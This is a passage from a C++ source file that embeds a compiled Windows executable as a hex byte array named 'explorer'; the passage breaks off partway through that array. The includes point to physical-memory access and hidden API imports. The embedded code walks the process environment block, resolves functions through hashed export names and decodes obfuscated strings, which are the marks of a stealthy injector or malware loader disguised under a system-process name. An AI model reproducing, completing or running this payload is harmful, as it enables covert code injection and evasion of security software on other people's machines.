#define _CRT_SECURE_NO_WARNINGS

typedef unsigned long ulong_t;

#include <Windows.h>
#include <vector>
#include <fstream>
#include <c_phymem.hpp>
#include <iostream>
#include <shared/nt.hpp>
#include "lazy_importer.hpp"
#include <conio.h>
#include <tlhelp32.h>

unsigned char explorer[8704] = {
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC8, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
	0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,
	0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
	0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20,
	0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
	0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x89, 0x62, 0x08, 0xDD,
	0xCD, 0x03, 0x66, 0x8E, 0xCD, 0x03, 0x66, 0x8E, 0xCD, 0x03, 0x66, 0x8E,
	0x3F, 0x74, 0x6F, 0x8F, 0xCC, 0x03, 0x66, 0x8E, 0x3F, 0x74, 0x99, 0x8E,
	0xCC, 0x03, 0x66, 0x8E, 0x3F, 0x74, 0x64, 0x8F, 0xCC, 0x03, 0x66, 0x8E,
	0x52, 0x69, 0x63, 0x68, 0xCD, 0x03, 0x66, 0x8E, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00,
	0x64, 0x86, 0x04, 0x00, 0x5F, 0x2E, 0x3E, 0x62, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00, 0x0B, 0x02, 0x0E, 0x1E,
	0x00, 0x18, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x10, 0x15, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x60, 0x81, 0x00, 0x00, 0x10, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
	0x74, 0x00, 0x00, 0x00, 0x9A, 0x16, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x18, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60,
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x34, 0x01, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x40, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x30, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x00, 0x1E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x73, 0x72,
	0x63, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0xC1, 0x49, 0xB8, 0xA8, 0x4A, 0x5D,
	0x7F, 0x16, 0x5F, 0xB9, 0xD0, 0x0F, 0xB6, 0xC8, 0x4C, 0x03, 0xC2, 0x41,
	0x22, 0xC8, 0x02, 0xC9, 0x2A, 0xC1, 0x04, 0x68, 0x41, 0x02, 0xC0, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x0F, 0xB6, 0xC1, 0x49, 0xB8, 0x19, 0xB1, 0xA2,
	0x65, 0xAA, 0xFA, 0x49, 0x26, 0x0F, 0xB6, 0xC8, 0x4C, 0x03, 0xC2, 0x41,
	0x22, 0xC8, 0x02, 0xC9, 0x2A, 0xC1, 0x04, 0x51, 0x41, 0x02, 0xC0, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x8D, 0x41, 0xAF, 0x80, 0xC2, 0x19, 0x32, 0xC2,
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x8D, 0x42, 0xA8, 0x80,
	0xE9, 0x68, 0x32, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0xC7, 0xC3, 0xFE, 0xFF, 0xFF, 0xFF,
	0x48, 0x8D, 0x41, 0x02, 0x48, 0x2B, 0xD9, 0x4C, 0x8B, 0xD9, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x14, 0x18,
	0xBA, 0x34, 0x00, 0x00, 0x00, 0x45, 0x8D, 0x42, 0xA8, 0x41, 0x0F, 0xB6,
	0xC8, 0x22, 0x48, 0xFE, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45,
	0x8D, 0x42, 0xA9, 0x00, 0x50, 0xFE, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48,
	0xFF, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02,
	0xD0, 0x45, 0x8D, 0x42, 0xAA, 0x00, 0x50, 0xFF, 0x41, 0x0F, 0xB6, 0xC8,
	0x22, 0x08, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41,
	0x02, 0xD0, 0x45, 0x8D, 0x42, 0xAB, 0x00, 0x10, 0x41, 0x0F, 0xB6, 0xC8,
	0x22, 0x48, 0x01, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2,
	0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42, 0xAC, 0x00, 0x50, 0x01, 0x41, 0x0F,
	0xB6, 0xC8, 0x22, 0x48, 0x02, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1,
	0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42, 0xAD, 0x00, 0x50, 0x02,
	0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x03, 0xBA, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42, 0xAE, 0x00,
	0x50, 0x03, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x04, 0xBA, 0x34, 0x00,
	0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42,
	0xAF, 0x00, 0x50, 0x04, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x05, 0xBA,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45,
	0x8D, 0x42, 0xB0, 0x00, 0x50, 0x05, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48,
	0x06, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02,
	0xD0, 0x45, 0x8D, 0x42, 0xB1, 0x00, 0x50, 0x06, 0x41, 0x0F, 0xB6, 0xC8,
	0x22, 0x48, 0x07, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2,
	0x41, 0x02, 0xD0, 0x00, 0x50, 0x07, 0x45, 0x8D, 0x42, 0xB2, 0xBA, 0x34,
	0x00, 0x00, 0x00, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x08, 0x48, 0x8D,
	0x40, 0x14, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42,
	0xB3, 0x00, 0x50, 0xF4, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF5, 0xBA,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45,
	0x8D, 0x42, 0xB4, 0x00, 0x50, 0xF5, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48,
	0xF6, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02,
	0xD0, 0x45, 0x8D, 0x42, 0xB5, 0x00, 0x50, 0xF6, 0x41, 0x0F, 0xB6, 0xC8,
	0x22, 0x48, 0xF7, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2,
	0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42, 0xB6, 0x00, 0x50, 0xF7, 0x41, 0x0F,
	0xB6, 0xC8, 0x22, 0x48, 0xF8, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1,
	0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42, 0xB7, 0x00, 0x50, 0xF8,
	0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF9, 0xBA, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42, 0xB8, 0x00,
	0x50, 0xF9, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xFA, 0xBA, 0x34, 0x00,
	0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45, 0x8D, 0x42,
	0xB9, 0x00, 0x50, 0xFA, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xFB, 0xBA,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2, 0x41, 0x02, 0xD0, 0x45,
	0x8D, 0x42, 0xBA, 0x00, 0x50, 0xFB, 0x41, 0x80, 0xEA, 0x45, 0xBA, 0x34,
	0x00, 0x00, 0x00, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xFC, 0x2A, 0xD1,
	0x41, 0x0F, 0xB6, 0xCA, 0x22, 0x48, 0xFD, 0x02, 0xD2, 0x41, 0x02, 0xD0,
	0x00, 0x50, 0xFC, 0xBA, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xD1, 0x02, 0xD2,
	0x41, 0x02, 0xD2, 0x00, 0x50, 0xFD, 0x48, 0x8D, 0x0C, 0x03, 0x48, 0x83,
	0xF9, 0x28, 0x0F, 0x82, 0xE4, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24,
	0x08, 0x49, 0x8B, 0xC3, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x49, 0xC7, 0xC3, 0xFE, 0xFF, 0xFF, 0xFF, 0x48,
	0x8D, 0x41, 0x02, 0x4C, 0x2B, 0xD9, 0x4C, 0x8B, 0xD1, 0x46, 0x8D, 0x0C,
	0x18, 0x45, 0x8D, 0x41, 0x1A, 0x41, 0x8D, 0x51, 0x19, 0x0F, 0xB6, 0xCA,
	0x22, 0x48, 0xFE, 0x02, 0xC9, 0x2A, 0xD1, 0x41, 0x0F, 0xB6, 0xC8, 0x22,
	0x48, 0xFF, 0x80, 0xC2, 0x51, 0x02, 0xC9, 0x00, 0x50, 0xFE, 0x44, 0x2A,
	0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xFF, 0x45, 0x8D, 0x41,
	0x1B, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x08, 0x02, 0xC9, 0x44, 0x2A, 0xC1,
	0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x00, 0x45, 0x8D, 0x41, 0x1C, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x01, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x01, 0x45, 0x8D, 0x41, 0x1D, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x02, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x02, 0x45, 0x8D, 0x41, 0x1E, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x03, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x03, 0x45, 0x8D, 0x41, 0x1F, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x04, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x04, 0x45, 0x8D, 0x41, 0x20, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x05, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x05, 0x45, 0x8D, 0x41, 0x21, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x06, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x06, 0x45, 0x8D, 0x41, 0x22, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x07, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x07, 0x45, 0x8D, 0x41, 0x23, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x08, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41,
	0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0x08, 0x45, 0x8D, 0x41, 0x24, 0x41,
	0x0F, 0xB6, 0xC8, 0x22, 0x48, 0x09, 0x02, 0xC9, 0x48, 0x8D, 0x40, 0x16,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xF3, 0x45,
	0x8D, 0x41, 0x25, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF4, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xF4, 0x45,
	0x8D, 0x41, 0x26, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF5, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xF5, 0x45,
	0x8D, 0x41, 0x27, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF6, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xF6, 0x45,
	0x8D, 0x41, 0x28, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF7, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xF7, 0x45,
	0x8D, 0x41, 0x29, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF8, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xF8, 0x45,
	0x8D, 0x41, 0x2A, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xF9, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xF9, 0x45,
	0x8D, 0x41, 0x2B, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xFA, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xFA, 0x45,
	0x8D, 0x41, 0x2C, 0x41, 0x0F, 0xB6, 0xC8, 0x22, 0x48, 0xFB, 0x02, 0xC9,
	0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xFB, 0x45,
	0x8D, 0x41, 0x2D, 0x41, 0x0F, 0xB6, 0xC8, 0x41, 0x80, 0xC1, 0x2E, 0x22,
	0x48, 0xFC, 0x02, 0xC9, 0x44, 0x2A, 0xC1, 0x41, 0x0F, 0xB6, 0xC9, 0x22,
	0x48, 0xFD, 0x41, 0x80, 0xC0, 0x51, 0x44, 0x00, 0x40, 0xFC, 0x02, 0xC9,
	0x44, 0x2A, 0xC9, 0x49, 0x8D, 0x0C, 0x03, 0x41, 0x80, 0xC1, 0x51, 0x44,
	0x00, 0x48, 0xFD, 0x48, 0x83, 0xF9, 0x2C, 0x0F, 0x82, 0xE0, 0xFD, 0xFF,
	0xFF, 0x49, 0x8B, 0xC2, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x53, 0x56,
	0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x8D, 0x6C, 0x24, 0x90,
	0x48, 0x81, 0xEC, 0x70, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25,
	0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x10,
	0x0F, 0x1F, 0x40, 0x00, 0x4C, 0x8B, 0x50, 0x30, 0x49, 0x63, 0x52, 0x3C,
	0x46, 0x8B, 0xB4, 0x12, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x03, 0xF2, 0x4D,
	0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18, 0x45, 0x85, 0xC9, 0x74,
	0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41, 0xB8, 0xF1, 0xF3, 0xF1,
	0xB0, 0x4A, 0x8D, 0x0C, 0x8B, 0x42, 0x8B, 0x34, 0x11, 0x49, 0x03, 0xF2,
	0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF, 0x74, 0x35, 0x90,
	0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01, 0x40, 0x80, 0xEF, 0x41,
	0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF, 0x19, 0x0F, 0xB6, 0x7E,
	0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44, 0x69, 0xC2, 0x93, 0x01,
	0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41, 0x81, 0xF8, 0xF5, 0xCE,
	0x62, 0x75, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75, 0xA7, 0x48, 0x8B, 0x00,
	0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E, 0x24, 0x0F, 0x57, 0xC0,
	0x49, 0x03, 0xCA, 0x45, 0x33, 0xE4, 0x0F, 0x11, 0x45, 0x80, 0x44, 0x89,
	0x65, 0xB0, 0x0F, 0x11, 0x45, 0x90, 0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41,
	0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA, 0x0F, 0x11, 0x45, 0xA0, 0x44, 0x8B,
	0x2C, 0x91, 0x48, 0x8D, 0x4D, 0x80, 0x4D, 0x03, 0xEA, 0x41, 0xFF, 0xD5,
	0x83, 0x7D, 0xB0, 0x01, 0x0F, 0x85, 0x76, 0x10, 0x00, 0x00, 0x4C, 0x89,
	0xBC, 0x24, 0x68, 0x01, 0x00, 0x00, 0x44, 0x89, 0xA5, 0xB8, 0x00, 0x00,
	0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x40, 0x18, 0x48, 0x8B, 0x40, 0x10, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x30,
	0x49, 0x63, 0x4A, 0x3C, 0x46, 0x8B, 0xB4, 0x11, 0x88, 0x00, 0x00, 0x00,
	0x4D, 0x03, 0xF2, 0x4D, 0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18,
	0x45, 0x85, 0xC9, 0x74, 0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41,
	0xB8, 0x77, 0xF1, 0xB4, 0xE9, 0x4B, 0x8D, 0x0C, 0x8A, 0x8B, 0x34, 0x19,
	0x49, 0x03, 0xF2, 0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF,
	0x74, 0x36, 0x66, 0x90, 0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01,
	0x40, 0x80, 0xEF, 0x41, 0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF,
	0x19, 0x0F, 0xB6, 0x7E, 0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44,
	0x69, 0xC2, 0x93, 0x01, 0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41,
